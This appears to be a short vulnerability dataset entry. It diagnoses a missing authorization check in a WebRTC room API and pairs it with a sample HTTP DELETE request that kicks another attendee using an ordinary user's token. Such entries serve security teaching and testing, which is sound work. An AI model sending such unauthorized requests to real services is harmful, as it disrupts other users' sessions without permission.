diagnosis: The endpoint disconnects a peer from a WebRTC room without verifying that current_user is the room moderator or that peer_id == current_user.peer_id. Any authenticated user can prematurely kick attendees from ongoing rooms.
exploit_request:
DELETE /api/v1/webrtc/rooms/conf_3310/peers/usr_guest_8819 HTTP/1.1
Host: api.example.com
Authorization: Bearer <regular_user_token>
